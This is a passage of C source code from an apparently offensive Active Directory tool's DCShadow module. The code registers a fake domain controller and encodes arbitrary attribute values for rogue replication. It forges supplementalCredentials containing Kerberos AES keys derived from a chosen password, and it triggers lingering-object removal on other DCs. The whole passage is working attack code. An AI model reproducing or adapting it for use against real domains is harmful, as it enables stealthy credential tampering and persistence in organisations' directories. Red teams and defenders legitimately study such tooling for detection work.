		{
			szNTDSADn = ldap_get_dn(info->ld, pEntry);
			szServerDN = wcsstr(szNTDSADn, L",CN=") + 1;
			dwErr = ldap_search_s(info->ld, szServerDN, LDAP_SCOPE_BASE, NULL, szAttributes, FALSE, &pServerMessage);
			if(dwErr == LDAP_SUCCESS)
			{
				szServerFQDN = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pServerMessage, szAttributes[0]);
				if (szServerFQDN && _wcsicmp(szServerFQDN, info->szDCFQDN) != 0)
				{
					kprintf(L"  * %s\n", szServerFQDN);
					if (!(dwErr = kuhl_m_lsadump_dcshadow_init_ldap(szServerFQDN, &ld)))
					{
						dwErr = kuhl_m_lsadump_dcshadow_lingering_trigger(ld, info->szDCDsServiceName, szObjectToKill);
						if (dwErr)
							PRINT_ERROR(L"trigger lingering for %s 0x%x (%u)\n", szServerFQDN, dwErr, dwErr);
						ldap_unbind(ld);
					}
					else PRINT_ERROR(L"ldap_connect 0x%x (%u)\n", dwErr, dwErr);
					LocalFree(szServerFQDN);
				}
				ldap_msgfree(pServerMessage);
			}

			pEntry = ldap_next_entry(info->ld, pEntry);
		}
		ldap_msgfree(pMessage);
	}
	return dwErr;
}

// ANSI version of ldap function used to match the fact that OID is a PSTR and not a PWSTR
BOOL kuhl_m_lsadump_dcshadow_build_replication_attribute(PDCSHADOW_DOMAIN_INFO info, PDCSHADOW_OBJECT_ATTRIBUTE attribute)
{
	DWORD dwErr;
	PWCHAR attributesFilter;
	PLDAPMessage pAttributeMessage = NULL;
	PSTR szAttributes[] = {"attributeID", "attributeSyntax", "systemFlags", NULL}, *pszSyntaxOid, *pszFlag;
	OssEncodedOID oid;
	
	attribute->dwSyntax = 0;
	if(kull_m_string_sprintf(&attributesFilter, L"(&(objectclass=attributeSchema)(lDAPDisplayName=%s))", attribute->szAttributeName))
	{
		dwErr = ldap_search_sW(info->ld, info->szConfigurationNamingContext, LDAP_SCOPE_SUBTREE, attributesFilter, NULL, FALSE, &pAttributeMessage);
		if(dwErr == LDAP_SUCCESS)
		{
			if(ldap_count_entries(info->ld, pAttributeMessage) == 1)
			{
				if(attribute->Oid)
					LocalFree(attribute->Oid);
				attribute->Oid =  kuhl_m_lsadump_dcshadow_getSingleTextAttrA(info->ld, pAttributeMessage, szAttributes[0]);
				pszSyntaxOid = ldap_get_valuesA(info->ld, pAttributeMessage, szAttributes[1]);
				if(pszSyntaxOid)
				{
					if(kull_m_asn1_DotVal2Eoid(*pszSyntaxOid, &oid))
					{
						if(oid.length == 3)
							attribute->dwSyntax = (oid.value[0] << 16) + (oid.value[1] << 8) + oid.value[2];
						else PRINT_ERROR(L"oid is invalid %S\n", pszSyntaxOid);
						kull_m_asn1_freeEnc(oid.value);
					}
					ldap_value_freeA(pszSyntaxOid);
				}
				pszFlag = ldap_get_valuesA(info->ld, pAttributeMessage, szAttributes[2]);
				if(pszFlag)
				{
					DWORD systemFlag = strtoul(*pszFlag, NULL, 10);
					if(systemFlag & 1) // FLAG_ATTR_NOT_REPLICATED
						kprintf(L" FLAG_ATTR_NOT_REPLICATED\n");
					if(systemFlag & 4) // FLAG_ATTR_IS_CONSTRUCTED
						kprintf(L" FLAG_ATTR_IS_CONSTRUCTED\n");
					ldap_value_freeA(pszFlag);
				}
			}
			else PRINT_ERROR(L"attribute does not exist\n");
			ldap_msgfree(pAttributeMessage);
		}
		else PRINT_ERROR(L"ldap_search_s 0x%x (%u)\n", dwErr, dwErr);
		LocalFree(attributesFilter);
	}
	return attribute->dwSyntax != 0;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_sid(ATTRVAL* pVal, PWSTR szValue)
{
	PSID pSid;
	pVal->pVal = NULL;
	if(ConvertStringSidToSid((PCWSTR) szValue, &pSid))
	{
		pVal->valLen = GetLengthSid(pSid);
		if(pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen))
			RtlCopyMemory(pVal->pVal, pSid, pVal->valLen);
		else PRINT_ERROR_AUTO(L"LocalAlloc");
		LocalFree(pSid);
	}
	else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
	return pVal->pVal != NULL;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_unicode_string(ATTRVAL* pVal, PWSTR szValue)
{
	
	pVal->valLen = (lstrlen(szValue) + 1) * sizeof(WCHAR);
	pVal->pVal = (PBYTE) MIDL_user_allocate( pVal->valLen);
	if(!pVal->pVal)
		return FALSE;
	RtlCopyMemory(pVal->pVal, szValue, pVal->valLen);
	return TRUE;
}

// take hex encoded string or guid in form {}
BOOL kuhl_m_lsadump_dcshadow_build_replication_value_octet_string(ATTRVAL* pVal, PWSTR szValue)
{
	DWORD len = lstrlen(szValue);
	
	if(len == 38 && szValue[0] == '{' && szValue[37] == '}')
	{
		GUID guid;
		UNICODE_STRING GuidString = {(USHORT)len*sizeof(WCHAR),(USHORT)len*sizeof(WCHAR), szValue};
		if(NT_SUCCESS(RtlGUIDFromString(&GuidString, &guid)))
		{
			pVal->valLen = sizeof(GUID);
			pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen);
			if(!pVal->pVal)
				return FALSE;
			RtlCopyMemory(pVal->pVal, &guid, sizeof(GUID));
			return TRUE;
		}
		else PRINT_ERROR(L"RtlGUIDFromString %s\n", szValue);

	}
	else
	{
		pVal->valLen = (ULONG) (len/2);
		pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen);
		if(!pVal->pVal)
			return FALSE;
		if(kull_m_string_stringToHex(szValue, pVal->pVal, pVal->valLen))
			return TRUE;
		PRINT_ERROR_AUTO(L"kull_m_string_stringToHex");
	}
	return FALSE;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_security_descriptor(ATTRVAL* pVal, PWSTR szValue)
{
	ULONG len = 0;
	PSECURITY_DESCRIPTOR sddl = NULL;
	
	if(ConvertStringSecurityDescriptorToSecurityDescriptor(szValue, SDDL_REVISION_1, &sddl, &len))
	{
		pVal->valLen = len;
		pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen);
		if(pVal->pVal)
			RtlCopyMemory(pVal->pVal, sddl, pVal->valLen);
		LocalFree(sddl);
	}
	else PRINT_ERROR_AUTO(L"ConvertStringSecurityDescriptorToSecurityDescriptor");
	return pVal->pVal != NULL;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_date(ATTRVAL* pVal, PWSTR szValue)
{
	ULONG len = 0;
	FILETIME ft;
	DSTIME dstime;
	
	if(kull_m_string_stringToFileTime(szValue, &ft))
	{
		pVal->valLen = sizeof(DSTIME);
		pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen);
		dstime = ((LONGLONG)(ft.dwLowDateTime + ((LONGLONG)ft.dwHighDateTime << 32))) / 10000000;
		if(pVal->pVal)
			RtlCopyMemory(pVal->pVal, &dstime, sizeof(DSTIME));
	}
	else PRINT_ERROR_AUTO(L"kull_m_string_stringToFileTime");
	return pVal->pVal != NULL;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_large_integer(ATTRVAL* pVal, PWSTR szValue)
{
	
	pVal->valLen = sizeof(__int64);
	pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen);
	if(pVal->pVal)
		*(__int64*) pVal->pVal = _wcstoui64(szValue, NULL, 10);
	return pVal->pVal != NULL;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_dword(ATTRVAL* pVal, PWSTR szValue)
{
	
	pVal->valLen = sizeof(DWORD);
	pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen);
	if(pVal->pVal)
		*(PDWORD) pVal->pVal = wcstoul(szValue, NULL, 10);
	return pVal->pVal != NULL;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_dn(ATTRVAL* pVal, PWSTR szValue)
{
	DWORD len = lstrlen(szValue);
	
	pVal->valLen = sizeof(DSNAME) + len * sizeof(WCHAR);
	pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen);
	if(pVal->pVal)
	{
		RtlZeroMemory(pVal->pVal, pVal->valLen);
		((DSNAME*)pVal->pVal)->structLen = pVal->valLen;
		((DSNAME*)pVal->pVal)->NameLen = len;
		RtlCopyMemory(((DSNAME*)pVal->pVal)->StringName, szValue, (len+1)*sizeof(WCHAR));
	}
	return pVal->pVal != NULL;
}

// we assume that the OID to be encoded are declared in SCHEMA_DEFAULT_PREFIX_TABLE
BOOL kuhl_m_lsadump_dcshadow_build_replication_value_oid(ATTRVAL* pVal, PWSTR szValue)
{
	BOOL fSuccess = FALSE;
	PSTR szANSIValue = kull_m_string_unicode_to_ansi(szValue);
	
	if(szANSIValue)
	{
		pVal->valLen = sizeof(DWORD);
		pVal->pVal = (PBYTE) MIDL_user_allocate(pVal->valLen);
		if(pVal->pVal)
			fSuccess = kull_m_rpc_drsr_MakeAttid((SCHEMA_PREFIX_TABLE*) &SCHEMA_DEFAULT_PREFIX_TABLE, szANSIValue, (ATTRTYP*) pVal->pVal, FALSE );
		LocalFree(szANSIValue);
	}
	return fSuccess;
}

BOOL dataToHexWithoutNull(LPCVOID data, DWORD dwData, LPBYTE dest, DWORD dwDest)
{
	BOOL status = FALSE;
	PCHAR buffer;
	DWORD dwBuffer = dwData * 2 + 1, i;
	if(dwDest >= (dwData * 2))
	{
		if(buffer = (PCHAR) LocalAlloc(LPTR, dwBuffer))
		{
			for(i = 0; i < dwData; i++)
				if(sprintf_s(buffer + i * 2, dwBuffer - i * 2, "%02x", ((PBYTE) data)[i]) < 2)
					break;
			if(status = (i == dwData))
				RtlCopyMemory(dest, buffer, dwBuffer - 1);
			LocalFree(buffer);
		}
	}
	return status;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_UserProperties(PUSER_PROPERTIES *properties, DWORD *dwProperties, DWORD count, ...)
{
	BOOL status = FALSE;
	va_list vaList;
	
	PCWSTR argType;
	PVOID argData;
	DWORD argDwData, argDwType, dwPackageString = 0, i;
	PUSER_PROPERTY property;
	PBYTE pStrings;

	*dwProperties = FIELD_OFFSET(USER_PROPERTIES, UserProperties) + 1;
	va_start(vaList, count);
	for(i = 0; i < count; i++)
	{
		argType = va_arg(vaList, PCWSTR);
		argData = va_arg(vaList, PVOID);
		argDwData = va_arg(vaList, DWORD);
		argDwType = lstrlen(argType);

		dwPackageString += argDwType;
		if(argType == wcsstr(argType, L"Primary:"))
			dwPackageString -= 8;
		*dwProperties += FIELD_OFFSET(USER_PROPERTY, PropertyName) + (argDwType * sizeof(wchar_t) + (argDwData * 2));
	}
	va_end(vaList);

	dwPackageString += count - 1; // \0 between
	dwPackageString *= sizeof(wchar_t);
	*dwProperties += FIELD_OFFSET(USER_PROPERTY, PropertyName) + (16 + (dwPackageString * 2)); // L"Packages"

	if(*properties = (PUSER_PROPERTIES) LocalAlloc(LPTR, *dwProperties))
	{
		(*properties)->Length = *dwProperties - 1 - FIELD_OFFSET(USER_PROPERTIES, Reserved4);
		for(i = 0; i < sizeof((*properties)->Reserved4); i+= sizeof(wchar_t))
			*(wchar_t *) ((*properties)->Reserved4 + i) = L' ';
		(*properties)->PropertySignature = L'P';
		(*properties)->PropertyCount = (USHORT) count + 1;

		va_start(vaList, count);
		for(i = 0, property = (*properties)->UserProperties; i < (*properties)->PropertyCount; i++, property = (PUSER_PROPERTY) ((PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength + property->ValueLength))
		{
			if(!i)
			{
				property->NameLength = 16; // L"Packages"
				property->ValueLength = (USHORT) dwPackageString * 2;
				property->Reserved = 2; // ?
				RtlCopyMemory(property->PropertyName, L"Packages", property->NameLength);
				pStrings = (PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength;
				dwPackageString = property->ValueLength;
			}
			else
			{
				argType = va_arg(vaList, PCWSTR);
				argData = va_arg(vaList, PVOID);
				argDwData = va_arg(vaList, DWORD);

				property->NameLength = (USHORT) lstrlen(argType) * sizeof(wchar_t);
				property->ValueLength = (USHORT) argDwData * 2;
				property->Reserved = 1; // ?
				RtlCopyMemory(property->PropertyName, argType, property->NameLength);
				if(!dataToHexWithoutNull(argData, argDwData, (PBYTE) property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength, property->ValueLength))
					break;

				argDwType = (argType == wcsstr(argType, L"Primary:")) ? 8 : 0;
				if(!dataToHexWithoutNull(property->PropertyName + argDwType, property->NameLength - (argDwType * sizeof(wchar_t)), pStrings, dwPackageString))
					break;
				pStrings += (property->NameLength - argDwType) * 2;
				dwPackageString -= (property->NameLength - argDwType) * 2;
				
				if((i + 1) < (*properties)->PropertyCount)
				{
					if(!dataToHexWithoutNull(L"\0", 2, pStrings, dwPackageString))
						break;
					pStrings += 4;
					dwPackageString -= 4;
				}
			}
		}
		va_end(vaList);
		if(!(status = (i == (*properties)->PropertyCount)))
			*properties = (PUSER_PROPERTIES) LocalFree(*properties);
	}
	return status;
}

// minimal for AES128 & AES256
BOOL kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_KerbStoredCredentialNew(LPCWSTR salt, LPCBYTE aes256, LPCBYTE aes128, DWORD iterations, PKERB_STORED_CREDENTIAL_NEW *creds, DWORD *dwSize)
{
	BOOL status = FALSE;
	DWORD dwSalt;
	PKERB_KEY_DATA_NEW pData;

	if(aes256 || aes128)
	{
		dwSalt = lstrlen(salt) * sizeof(wchar_t);
		*dwSize = sizeof(KERB_STORED_CREDENTIAL_NEW) + dwSalt;
		if(aes256)
			*dwSize += sizeof(KERB_KEY_DATA_NEW) + AES_256_KEY_LENGTH;
		if(aes128)
			*dwSize += sizeof(KERB_KEY_DATA_NEW) + AES_128_KEY_LENGTH;
		if(*creds = (PKERB_STORED_CREDENTIAL_NEW) LocalAlloc(LPTR, *dwSize))
		{
			(*creds)->Revision = 4;
			if(aes256)
				(*creds)->CredentialCount++;
			if(aes128)
				(*creds)->CredentialCount++;
			(*creds)->DefaultSaltLength = (*creds)->DefaultSaltMaximumLength = (USHORT) dwSalt;
			(*creds)->DefaultSaltOffset = sizeof(KERB_STORED_CREDENTIAL_NEW) + (*creds)->CredentialCount * sizeof(KERB_KEY_DATA_NEW);
			(*creds)->DefaultIterationCount = iterations;
			RtlCopyMemory((PBYTE) *creds + (*creds)->DefaultSaltOffset, salt, (*creds)->DefaultSaltMaximumLength);
			pData = (PKERB_KEY_DATA_NEW) ((PBYTE) (*creds) + sizeof(KERB_STORED_CREDENTIAL_NEW));
			pData[0].IterationCount = iterations;
			pData[0].KeyType = aes256 ? KERB_ETYPE_AES256_CTS_HMAC_SHA1_96 : KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
			pData[0].KeyLength = aes256 ? AES_256_KEY_LENGTH : AES_128_KEY_LENGTH;
			pData[0].KeyOffset = (*creds)->DefaultSaltOffset + (*creds)->DefaultSaltMaximumLength;
			RtlCopyMemory((PBYTE) *creds + pData[0].KeyOffset, aes256 ? aes256 : aes128, pData[0].KeyLength);
			if(aes128)
			{
				pData[1].IterationCount = iterations;
				pData[1].KeyType = KERB_ETYPE_AES128_CTS_HMAC_SHA1_96;
				pData[1].KeyLength = AES_128_KEY_LENGTH;
				pData[1].KeyOffset = pData[0].KeyOffset + pData[0].KeyLength;
				RtlCopyMemory((PBYTE) *creds + pData[1].KeyOffset, aes128, pData[1].KeyLength);
			}
			status = TRUE;
		}
	}
	return status;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_valueFromArgs(LPCWSTR theArg, DWORD count, PWSTR *salt, PBYTE *aes256, PBYTE *aes128)
{
	BOOL status = FALSE;
	int ret;
	wchar_t bSalt[64 + 1] = {0}, bAes256[64 + 1] = {0}, bAes128[64 + 1] = {0};
	UNICODE_STRING uSalt, uAes256, uAes128;
	DWORD size;

	if(theArg)
	{
		*salt = NULL;
		*aes256 = NULL;
		*aes128 = NULL;

		ret = swscanf_s(theArg, L"%[^:]:%[^:]:%s", bSalt, ARRAYSIZE(bSalt), bAes256, ARRAYSIZE(bAes256), bAes128, ARRAYSIZE(bAes128));
		if(ret > 1)
		{
			RtlInitUnicodeString(&uSalt, bSalt);
			kprintf(L"Salt  : %wZ\nAES256: ", &uSalt);
			if(lstrlen(bAes256) != (AES_256_KEY_LENGTH * 2))
			{
				RtlInitUnicodeString(&uAes256, bAes256);
				kprintf(L"(password - %wZ) ", &uAes256);
				kuhl_m_kerberos_hash_data_raw(KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, &uAes256, &uSalt, count, aes256, &size);
			}
			else
			{
				kprintf(L"(hex) ");
				if(!kull_m_string_stringToHexBuffer(bAes256, aes256, &size))
					PRINT_ERROR(L"kull_m_string_stringToHexBuffer(AES256)\n");
			}
			if(*aes256)
			{
				kull_m_string_wprintf_hex(*aes256, size, 0);
				kprintf(L"\n");
				if(status = kull_m_string_copy(salt, bSalt))
				{
					if(ret > 2)
					{
						kprintf(L"AES128: ");
						if(lstrlen(bAes128) != (AES_128_KEY_LENGTH * 2))
						{
							RtlInitUnicodeString(&uAes128, bAes128);
							kprintf(L"(password - %wZ) ", &uAes128);
							kuhl_m_kerberos_hash_data_raw(KERB_ETYPE_AES128_CTS_HMAC_SHA1_96, &uAes128, &uSalt, count, aes128, &size);
						}
						else
						{
							kprintf(L"(hex) ");
							if(!kull_m_string_stringToHexBuffer(bAes128, aes128, &size))
								PRINT_ERROR(L"kull_m_string_stringToHexBuffer(AES128)\n");
						}
						if(*aes128)
						{
							kull_m_string_wprintf_hex(*aes128, size, 0);
							kprintf(L"\n");
						}
					}
				}
				else
				{
					*aes256 = (PBYTE) LocalFree(*aes256);
					PRINT_ERROR_AUTO(L"kull_m_string_copy");
				}
			}
		}
		else PRINT_ERROR(L"Error when parsing argument: %s (ret: %i)\n", theArg, ret);
	}
	else PRINT_ERROR(L"NULL arg\n");
	return status;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials(ATTRVAL* pVal, PWSTR szValue)
{
	BOOL status = FALSE;
	PWSTR salt;
	PBYTE aes256, aes128;
	PKERB_STORED_CREDENTIAL_NEW kerbCredentials;
	DWORD dwKerbCredentials;
	PUSER_PROPERTIES properties;
	DWORD dwProperties;

	kprintf(L"\n== Encoder helper for supplementalCredentials ==\n\n");
	if(kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_valueFromArgs(szValue, 4096, &salt, &aes256, &aes128))
	{
		if(kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_KerbStoredCredentialNew(salt, aes256, aes128, 4096, &kerbCredentials, &dwKerbCredentials))
		{
			if(kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials_UserProperties(&properties, &dwProperties, 1, L"Primary:Kerberos-Newer-Keys", kerbCredentials, dwKerbCredentials))
			{
				kuhl_m_lsadump_dcsync_descrUserProperties(properties);
				if(pVal->pVal = (PBYTE) MIDL_user_allocate(dwProperties))
				{
					pVal->valLen = dwProperties;
					RtlCopyMemory(pVal->pVal, properties, pVal->valLen);
					status = TRUE;
				}
				LocalFree(properties);
			}
			LocalFree(kerbCredentials);
		}
		if(salt)
			LocalFree(salt);
		if(aes256)
			LocalFree(aes256);
		if(aes128)
			LocalFree(aes128);
	}
	return status;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication_value(PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE attribute)
{
	DWORD i;
	DCSHADOW_SYNTAX_ENCODER encoder = NULL;

	attribute->AttrVal.pAVal = (ATTRVAL*) MIDL_user_allocate(sizeof(ATTRVAL) * attribute->AttrVal.valCount);
	if(!attribute->AttrVal.pAVal)
		return FALSE;
	
	if(attribute->pAttribute->szAttributeName)
	{
		if(!_wcsicmp(attribute->pAttribute->szAttributeName, L"supplementalCredentials"))
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_supplementalCredentials;
	}
	
	if(!encoder)
	{
		switch (attribute->pAttribute->dwSyntax)
		{
		case SYNTAX_UNICODE_STRING:
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_unicode_string;
			break;
		case SYNTAX_OCTET_STRING:
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_octet_string;
			break;
		case SYNTAX_DN:
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_dn;
			break;
		case SYNTAX_INTEGER:
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_dword;
			break;
		case SYNTAX_LARGE_INTEGER:
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_large_integer;
			break;
		case SYNTAX_SID:
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_sid;
			break;
		case SYNTAX_NTSECURITYDESCRIPTOR:
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_security_descriptor;
			break;
		case SYNTAX_GENERALIZED_TIME:
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_date;
			break;
		case SYNTAX_OID:
			encoder = kuhl_m_lsadump_dcshadow_build_replication_value_oid;
			break;
		default:
			PRINT_ERROR(L"Syntax for attribute %s not implemented (0x%x)", attribute->pAttribute->szAttributeName, attribute->pAttribute->dwSyntax);
			return FALSE;
		}
	}
	for(i = 0; i < attribute->AttrVal.valCount; i++)
	{
		if(!encoder(attribute->AttrVal.pAVal + i, attribute->pszValue[i]))
		{
			PRINT_ERROR(L"Unable to encode %s (%s)", attribute->pAttribute->szAttributeName, attribute->pszValue[i]);
			return FALSE;
		}
	}
	return TRUE;
}

// try to convert attributeschema into oid (reminder: strict input is oid value only)
BOOL kuhl_m_lsadump_dcshadow_build_replication_get_schema_oid_values(PDCSHADOW_DOMAIN_INFO info, PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE attr)
{
	BOOL fSuccess = FALSE;
	DWORD i, dwErr;
	PWSTR szFilter, szTempValue, szAttributes[] = {L"governsID", NULL};
	LDAPMessage *pSearchResult = NULL;
	
	for(i = 0; i< attr->AttrVal.valCount; i++)
	{	
		fSuccess = FALSE;
		if(kull_m_string_sprintf(&szFilter, L"(&(objectClass=classSchema)(lDAPDisplayName=%s))", attr->pszValue[i]))
		{
			if(!(dwErr = ldap_search_s(info->ld, info->szSchemaNamingContext, LDAP_SCOPE_ONELEVEL, szFilter, szAttributes, FALSE, &pSearchResult)))
			{
				if(ldap_count_entries(info->ld, pSearchResult) == 1)
				{
					szTempValue = kuhl_m_lsadump_dcshadow_getSingleTextAttr(info->ld, pSearchResult, szAttributes[0]);
					if(szTempValue)
					{
						LocalFree(attr->pszValue[i]);
						attr->pszValue[i]  = szTempValue;
						fSuccess = TRUE;
					}
				}
				else PRINT_ERROR(L"objectClass %s not found in AD\n", attr->pszValue[i]);
				ldap_msgfree(pSearchResult);
			}
			else PRINT_ERROR(L"objectClass not found in AD 0x%x (%u)\n", dwErr, dwErr);
		}
		if (!fSuccess)
			break;
	}
	return fSuccess;
}

BOOL kuhl_m_lsadump_dcshadow_build_replication(PDCSHADOW_DOMAIN_INFO info)
{
	DWORD i, j, k, dwAttributeId;;
	
	kprintf(L"** Attributes checking **\n\n");
	for(i = 0; i < info->request->cNumAttributes; i++)
	{
		kprintf(L"#%u: %s\n", i, info->request->pAttributes[i].szAttributeName);
		if(!kuhl_m_lsadump_dcshadow_build_replication_attribute(info, info->request->pAttributes + i))
		{
			return FALSE;
		}
	}
	kprintf(L"\n");
	kprintf(L"** Objects **\n\n");
	for(i = 0; i < info->request->cNumObjects; i++)
	{
		kprintf(L"#%u: %s\n", i, info->request->pObjects[i].szObjectDN);
		
		if(!kuhl_m_lsadump_dcshadow_build_replication_version(info->ld, info->szDomainNamingContext, info->request->pObjects + i))
		{
			return FALSE;
		}

		if(info->request->pObjects[i].dwFlag & OBJECT_TO_ADD)
		{
			kprintf(L"Object will be added\n");
		}
		if (info->request->pObjects[i].dwFlag & OBJECT_DYNAMIC)
			kprintf(L"Dynamic object\n");
		for(j = 0; j < info->request->pObjects[i].cbAttributes; j++)
		{
			BOOL fRemoveAtt = FALSE;
			PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE attr = info->request->pObjects[i].pAttributes + j;
			// MS-DRSR : 4.1.1.2.10 PerformModifyEntInf
			// The objectGUID and objectSid of the object being modified are returned in the info output structure.
			if(_wcsicmp(attr->pAttribute->szAttributeName, L"ObjectGUID") == 0)
			{
				DWORD len = lstrlen(attr->pszValue[0]);
				UNICODE_STRING GuidString = {(USHORT)len*sizeof(WCHAR),(USHORT)len*sizeof(WCHAR), attr->pszValue[0]};
				if(NT_SUCCESS(RtlGUIDFromString(&GuidString, &info->request->pObjects[i].ObjectGUID)))
				{
					kprintf(L"  with GUID %s\n", attr->pszValue[0]);
				}
				fRemoveAtt = TRUE;
			}
			else if(_wcsicmp(attr->pAttribute->szAttributeName, L"parentGUID") == 0)
			{
				DWORD len = lstrlen(attr->pszValue[0]);
				UNICODE_STRING GuidString = {(USHORT)len*sizeof(WCHAR),(USHORT)len*sizeof(WCHAR), attr->pszValue[0]};
				if(NT_SUCCESS(RtlGUIDFromString(&GuidString, &info->request->pObjects[i].ParentGuid)))
				{
					kprintf(L"  with Parent GUID %s\n", attr->pszValue[0]);
				}
				fRemoveAtt = TRUE;
			}
			else if(_wcsicmp(attr->pAttribute->szAttributeName, L"ObjectSid") == 0)
			{
				PSID pSid;
				if(ConvertStringSidToSid(attr->pszValue[0], &pSid))
				{
					kprintf(L"  with SID %s\n", attr->pszValue[0]);
					RtlCopyMemory(&info->request->pObjects[i].pSid, pSid, 28);
					LocalFree(pSid);
				}
				fRemoveAtt = TRUE;
			}
			if(fRemoveAtt)
			{
				RtlCopyMemory(attr, info->request->pObjects[i].pAttributes + info->request->pObjects[i].cbAttributes -1 , sizeof(DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE));
				j--;
				info->request->pObjects[i].cbAttributes--;
				continue;
			}

			// encode class into OID if needed (string without a dot) - better for UI
			if(attr->pAttribute->dwSyntax == SYNTAX_OID && attr->AttrVal.valCount > 0 && wcschr(attr->pszValue[0], '.') == NULL)
			{
				if(!kuhl_m_lsadump_dcshadow_build_replication_get_schema_oid_values(info, attr))
					return FALSE;
			}
			if(!kuhl_m_lsadump_dcshadow_build_replication_value(attr))
			{
				return FALSE;
			}
			
			kull_m_rpc_drsr_MakeAttid((SCHEMA_PREFIX_TABLE*)&SCHEMA_DEFAULT_PREFIX_TABLE, attr->pAttribute->Oid, &dwAttributeId, FALSE);
			kprintf(L"  %s (%S-%x rev %u): \n", attr->pAttribute->szAttributeName, attr->pAttribute->Oid, dwAttributeId, attr->MetaData.curRevision);
			for(k = 0; k < attr->AttrVal.valCount; k++)
			{
				kprintf(L"    %s\n    (", attr->pszValue[k]);
				kull_m_string_wprintf_hex(attr->AttrVal.pAVal[k].pVal, attr->AttrVal.pAVal[k].valLen, 0);
				kprintf(L")\n");
			}
			if (attr->MetaData.dwFlag & REPLICATION_TIME_SET)
			{
				kprintf(L"    usnTimeChanged:");
				kull_m_string_displayFileTime(&attr->MetaData.usnTimeChanged);
				kprintf(L"\n");
			}
			if (attr->MetaData.dwFlag & REPLICATION_USN_SET)
			{
				kprintf(L"    usnOriginating:%u\n", attr->MetaData.usnOriginating);
			}
			if (attr->MetaData.dwFlag & REPLICATION_UID_SET)
			{
				kprintf(L"    uidOriginatingDsa:");
				kull_m_string_displayGUID(&attr->MetaData.uidOriginatingDsa);
				kprintf(L"\n");
				
			}
			kprintf(L"\n");
		}
	}
	kprintf(L"\n");
	return TRUE;
}

BOOL kuhl_m_lsadump_dcshadow_domain_and_replication_info(PDCSHADOW_DOMAIN_INFO info)
{
	BOOL fSuccess = FALSE;
	DWORD dwErr = 0;

	kprintf(L"** Domain Info **\n\n");
	fSuccess = kuhl_m_lsadump_dcshadow_domaininfo_rootDse(info)
		&& (!info->fUseSchemaSignature || kuhl_m_lsadump_dcshadow_domaininfo_schemasignature(info));
	if(fSuccess)
	{
		fSuccess = kuhl_m_lsadump_dcshadow_domaininfo_computer(info);
	}
	kprintf(L"\n");
	if(fSuccess)
	{
		kprintf(L"** Server Info **\n\n");
		if(fSuccess = kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(info, info->szDCFQDN, &info->realDc))
		{
			kprintf(L"Server: %s\n  InstanceId  : ", info->szDCFQDN);
			kull_m_string_displayGUID(&info->realDc.InstanceId);
			kprintf(L"\n  InvocationId: ");
			kull_m_string_displayGUID(&info->realDc.InvocationId);
			kprintf(L"\n");
		}
		RtlZeroMemory(&info->mimiDc, sizeof(DCSHADOW_DOMAIN_DC_INFO));
		if(kuhl_m_lsadump_dcshadow_objectGUID_invocationGUID(info, info->szFakeFQDN, &info->mimiDc))
		{
			kprintf(L"Fake Server (already registered): %s\n  InstanceId  : ", info->szFakeFQDN);
			kull_m_string_displayGUID(&info->mimiDc.InstanceId);
			kprintf(L"\n  InvocationId: ");
			kull_m_string_displayGUID(&info->mimiDc.InvocationId);
			kprintf(L"\n");
		}
		else kprintf(L"Fake Server (not already registered): %s\n", info->szFakeFQDN);
		kprintf(L"\n");
	}
	if(fSuccess && info->request != NULL)
		fSuccess = kuhl_m_lsadump_dcshadow_build_replication(info);
	return fSuccess;
}

static BOOL IsNullGuid(GUID* Guid)
{
	if (Guid->Data1 == 0 && Guid->Data2 == 0 && Guid->Data3 == 0 &&
		((ULONG *)Guid->Data4)[0] == 0 && ((ULONG *)Guid->Data4)[1] == 0)
	{
		return TRUE;
	}
	return FALSE;
}

BOOL kuhl_m_lsadump_dcshadow_object_to_replentinflist(PDCSHADOW_DOMAIN_INFO info, REPLENTINFLIST ** ppReplEnt, PDCSHADOW_PUSH_REQUEST_OBJECT object, SCHEMA_PREFIX_TABLE *pPrefixTableSrc, PFILETIME pCurrentFt)
{
	DWORD i, len;
	
